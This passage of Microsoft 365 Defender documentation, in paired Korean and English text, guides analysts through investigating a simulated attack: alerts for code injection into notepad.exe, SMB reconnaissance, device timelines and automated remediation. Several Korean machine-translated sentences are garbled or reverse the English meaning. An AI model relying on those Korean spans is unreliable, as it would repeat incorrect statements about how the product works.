#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="03e09-206">단일 인시던트로 공격 조사</span><span class="sxs-lookup"><span data-stu-id="03e09-206">Investigate the attack as a single incident</span></span>

<span data-ttu-id="03e09-207">Microsoft 365 Defender 서로 연관하고 서로 다른 제품의 모든 관련 경고 및 조사를 하나의 인시던트 엔터티로 집계합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="03e09-208">이렇게 하면 Microsoft 365 Defender 공격 범위가 넓어지며 SOC 분석가가 복잡한 위협을 이해하고 대응할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="03e09-209">이 시뮬레이션 중에 생성된 경고는 동일한 위협과 연결되며 그 결과로 자동으로 단일 인시던트로 집계됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="03e09-210">인시던트 보기:</span><span class="sxs-lookup"><span data-stu-id="03e09-210">To view the incident:</span></span>

1. <span data-ttu-id="03e09-211">웹 Microsoft 365 Defender [를 열 수 있습니다.](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="03e09-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="03e09-212">탐색 창에서 인시던트 및 & 알림 > **선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="03e09-213">사고 이름 왼쪽에 있는 원을 클릭하여 새 항목을 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="03e09-214">사이드 패널에는 모든 관련 경고를 포함하여 인시던트에 대한 추가 정보가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="03e09-215">각 인시던트에는 포함된 경고의 특성에 따라 해당 이름을 설명하는 고유한 이름이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   <span data-ttu-id="03e09-216">대시보드에 표시되는 경고는 ID용 Microsoft Defender, id용 Microsoft Defender, Microsoft Cloud App Security, 끝점용 Microsoft Defender, Microsoft 365 Defender 및 Microsoft Defender for Office 365.</span><span class="sxs-lookup"><span data-stu-id="03e09-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="03e09-217">**인시던트에 대한** 자세한 정보를 확인하려면 문제 페이지 열기 를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="03e09-218">**인시던트 페이지에서** 인시던트와 관련된 모든 경고 및 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="03e09-219">이 정보에는 경고와 관련된 엔터티 및 자산, 경고의 검색 원본(예: ID용 Microsoft Defender 또는 끝점용 Microsoft Defender) 및 이러한 엔터티가 함께 연결된 이유가 포함됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="03e09-220">인시던트 경고 목록을 검토하면 공격의 진행률이 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="03e09-221">이 보기에서 개별 경고를 보고 조사할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="03e09-222">오른쪽 메뉴에서  인시던트 관리를 클릭하여 인시던트에 태그를 지정하고, 인시던트에 할당하고, 설명을 추가할 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="03e09-223">생성된 경고 검토</span><span class="sxs-lookup"><span data-stu-id="03e09-223">Review generated alerts</span></span>

<span data-ttu-id="03e09-224">시뮬레이트된 공격 중에 생성되는 몇 가지 경고를 살펴보아 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="03e09-225">시뮬레이트된 공격 중에 생성된 몇 가지 경고만 진행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="03e09-226">테스트 장치에서 실행되는 Windows 및 Microsoft 365 Defender 버전에 따라 약간 다른 순서로 더 많은 경고가 표시될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![생성된 경고의 예](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="03e09-228">경고: 관찰된 의심스러운 프로세스 삽입(원본: 끝점용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="03e09-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="03e09-229">고급 공격자는 정교한 도용 방법을 사용하여 메모리를 유지하고 검색 도구에서 숨길 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="03e09-230">한 가지 일반적인 기술은 악의적인 실행이 아닌 신뢰할 수 있는 시스템 프로세스 내에서 작동하여 검색 도구 및 보안 운영에서 악성 코드를 발견하기 어렵게 만드는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="03e09-231">SOC 분석가가 이러한 고급 공격을 감지할 수 있도록 끝점용 Microsoft Defender의 심층 메모리 센서는 다양한 프로세스 간 코드 삽입 기술에 대한 전례 없는 가시성을 클라우드 서비스를 제공합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="03e09-232">다음 그림에서는 Endpoint용 Defender가 에 코드를 삽입하려고 시도를 감지하고 경고하는 <i>방법을notepad.exe. </i></span><span class="sxs-lookup"><span data-stu-id="03e09-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![잠재적으로 악성 코드 삽입에 대한 경고의 예](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="03e09-234">경고: 명령줄 인수가 없는 프로세스가 실행되는 예기치 않은 동작(원본: 끝점용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="03e09-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="03e09-235">끝점 검색을 위한 Microsoft Defender는 종종 공격 기술의 가장 일반적인 특성을 대상으로 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="03e09-236">이 방법을 사용하면 지속성이 보장되고 공격자가 최신 전략으로 전환할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="03e09-237">당사는 대규모 학습 알고리즘을 사용하여 조직 및 전 세계에 있는 일반적인 프로세스의 정상적인 동작을 설정하고 이러한 프로세스가 정상적인 동작을 표시하는 경우를 감시합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="03e09-238">이러한 특이한 동작은 종종 신뢰할 수 있는 프로세스에서 불일치 코드가 도입되고 실행되고 있는 것을 나타냅니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="03e09-239">이 시나리오에서 프로세스 <i></i>notepad.exe외부 위치와의 통신과 관련된 비정상적인 동작이 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="03e09-240">이 결과는 악성 코드를 도입하고 실행하는 데 사용되는 특정 방법과는 독립적입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="03e09-241">이 경고는 추가 백엔드 처리가 필요한 기계 학습 모델을 기반으로 하기 때문에 포털에 이 경고가 표시되기까지 다소 시간이 걸릴 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="03e09-242">경고 세부 정보에는 조사를 확장하기 위해 피벗으로 사용할 수 있는 표시기인 외부 IP 주소가 포함되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="03e09-243">IP 주소 세부 정보 페이지를 확인하려면 경고 프로세스 트리에서 IP 주소를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![명령줄 인수가 없는 프로세스가 실행된 경우의 예기치 않은 동작에 대한 경고 예제](../../media/mtp/fig8.png)

<span data-ttu-id="03e09-245">다음 그림에는 선택한 IP 주소 세부 정보 페이지(경고 프로세스 트리에서 IP 주소 클릭)가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![IP 주소 세부 정보 페이지의 예](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="03e09-247">경고: SMB(사용자 및 IP 주소 정)(원본: ID용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="03e09-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="03e09-248">SMB(서버 메시지 블록) 프로토콜을 사용하여 열문을 사용하면 공격자가 최근 사용자 로그온 정보를 얻을 수 있습니다. 이 정보를 통해 공격자는 네트워크를 통해 먼 으로 이동하여 특정 중요한 계정에 액세스하는 데 도움이 됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="03e09-249">이 검색에서는 도메인 컨트롤러에 대해 SMB 세션 열호가 실행될 때 경고가 트리거됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![사용자 및 IP 주소 정 분석에 대한 ID에 대한 Microsoft Defender 경고의 예](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="03e09-251">끝점용 Microsoft Defender를 사용하여 장치 타임라인 검토</span><span class="sxs-lookup"><span data-stu-id="03e09-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="03e09-252">이 인시던트에서 다양한 경고를 탐색한 후 앞에서 조사한 문제 페이지로 다시 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="03e09-253">**인시던트** 페이지에서 장치 탭을 선택하여 끝점용 Microsoft Defender 및 ID용 Microsoft Defender에서 보고한 이 인시던트와 관련된 장치를 검토합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="03e09-254">공격이 수행된 디바이스의 이름을 선택하여 해당 특정 장치에 대한 엔터티 페이지를 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="03e09-255">해당 페이지에서 트리거된 경고 및 관련 이벤트를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="03e09-256">시간 표시 **막대 탭을** 선택하여 디바이스 타임라인을 열고 장치에서 관찰된 모든 이벤트 및 동작을 시간 순서대로 보고 경고가 발생했습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![동작이 있는 디바이스 타임라인의 예](../../media/mtp/fig11.png)

<span data-ttu-id="03e09-258">좀 더 흥미로운 동작 중 일부를 확장하면 프로세스 트리와 같은 유용한 세부 정보가 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="03e09-259">예를 들어 경고 이벤트 의심스러운 프로세스 주입이 발견될 때까지 아래로 **스크롤합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="03e09-260">왼쪽 **창의** powershell.exe 그래프 아래에 이 동작에 대한 전체 프로세스 트리를 표시하려면 notepad.exe  프로세스 이벤트에 삽입된 옵션을 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="03e09-261">필요한 경우 필터링에 검색 표시줄을 사용하세요.</span><span class="sxs-lookup"><span data-stu-id="03e09-261">Use the search bar for filtering if necessary.</span></span>

![선택한 PowerShell 파일 만들기 동작에 대한 프로세스 트리의 예](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="03e09-263">사용자 정보를 검토할 Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="03e09-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="03e09-264">인시던트 페이지에서  사용자 탭을 선택하여 공격에 관련된 사용자 목록을 표시합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="03e09-265">이 표에는 각 사용자의 조사 우선 순위 점수를 포함하여 각 사용자에 대한 추가 **정보가 포함되어** 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="03e09-266">사용자 이름을 선택하여 추가 조사를 실시할 수 있는 사용자의 프로필 페이지를 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="03e09-267">[위험한 사용자 조사에 대해 자세히 읽어 를 읽어 읽습니다.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="03e09-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![사용자 Cloud App Security 예](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="03e09-269">자동화된 조사 및 수정</span><span class="sxs-lookup"><span data-stu-id="03e09-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="03e09-270">이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 자동화된 자동 복구가 무엇일지, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는지 익숙해지기 전에 다음 비디오를 시청해 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="03e09-271">사이트 포털에서 인시던트로 Microsoft 365 Defender 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="03e09-272">**인시던트** 페이지의  조사 탭에는 ID에 대한 Microsoft Defender 및 끝점용 Microsoft Defender에서 트리거한 자동화된 조사가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="03e09-273">아래 스크린샷에는 Endpoint용 Defender에서 트리거한 자동화된 조사만 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="03e09-274">기본적으로 Endpoint용 Defender는 큐에서 발견된 아티팩트를 자동으로 수정하여 수정해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![인시던트와 관련된 자동화된 조사의 예](../../media/mtp/fig14.png)

<span data-ttu-id="03e09-276">조사를 트리거한 경고를 선택하여 조사 세부 정보 **페이지를 열** 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="03e09-277">다음과 같은 세부 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-277">You'll see the following details:</span></span>

- <span data-ttu-id="03e09-278">자동화된 조사를 트리거한 경고입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="03e09-279">영향을 미치는 사용자 및 장치.</span><span class="sxs-lookup"><span data-stu-id="03e09-279">Impacted users and devices.</span></span> <span data-ttu-id="03e09-280">추가 장치에서 표시기가 발견되는 경우 이러한 추가 장치도 나열됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="03e09-281">증거 목록입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-281">List of evidence.</span></span> <span data-ttu-id="03e09-282">파일, 프로세스, 서비스, 드라이버 및 네트워크 주소와 같은 엔터티를 찾아 분석합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="03e09-283">이러한 엔터티는 경고와의 가능한 관계에 대해 분석하고 양성 또는 악의적인 것으로 등급이 지정됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="03e09-284">위협이 발견됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-284">Threats found.</span></span> <span data-ttu-id="03e09-285">조사 중에 발견된 알려진 위협입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="03e09-286">시기에 따라 자동화된 조사가 계속 실행되고 있을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="03e09-287">증거를 수집 및 분석하고 결과를 검토하기 전에 프로세스가 완료될 때까지 몇 분 정도 기다립니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="03e09-288">조사 **세부 정보 페이지를 새로** 고쳐 최신 결과를 얻습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![조사 세부 정보 페이지의 예](../../media/mtp/fig15.png)

<span data-ttu-id="03e09-290">자동화된 조사 중에 끝점용 Microsoft Defender는 수정이 notepad.exe 아티팩트 중 하나로 주입된 프로세스가 확인되었습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="03e09-291">Endpoint용 Defender는 자동화된 수정의 일부로 의심스러운 프로세스 삽입을 자동으로 중지합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="03e09-292">테스트 장치에서 <i>notepad.exe</i> 프로세스 목록에서 사라지는 과정을 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="03e09-293">인시던트 해결</span><span class="sxs-lookup"><span data-stu-id="03e09-293">Resolve the incident</span></span>

<span data-ttu-id="03e09-294">조사가 완료된 후 수정이 확인되면 인시던트가 해결됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="03e09-295">**인시던트 페이지에서** 인시던트 **관리를 선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="03e09-296">상태를 **인시던트 해결로** 설정하고 분류 및 보안 테스트에서 **확인을** 위해 True **경고를** 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![인시던트 해결을 위해 스위치를 클릭할 수 있는 열린 문제 관리 패널이 있는 인시던트 페이지의 예](../../media/mtp/fig16.png)

<span data-ttu-id="03e09-298">인시던트가 해결되면 인시던트 포털 및 관련 포털에서 Microsoft 365 Defender 모든 관련 알림을 해결합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="03e09-299">그러면 인시던트 분석, 자동화된 조사 및 인시던트 해결에 대한 공격 시뮬레이션이 마무리됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="03e09-300">다음 단계</span><span class="sxs-lookup"><span data-stu-id="03e09-300">Next step</span></span>

<span data-ttu-id="03e09-301">[![인시던트 Microsoft 365 Defender 기능 시도](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="03e09-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="03e09-302">2단계 중 2단계: [인시던트 Microsoft 365 Defender 기능 시도](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="03e09-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="03e09-303">필요한 탐색</span><span class="sxs-lookup"><span data-stu-id="03e09-303">Navigation you may need</span></span>

[<span data-ttu-id="03e09-304">Microsoft 365 Defender 환경 만들기</span><span class="sxs-lookup"><span data-stu-id="03e09-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
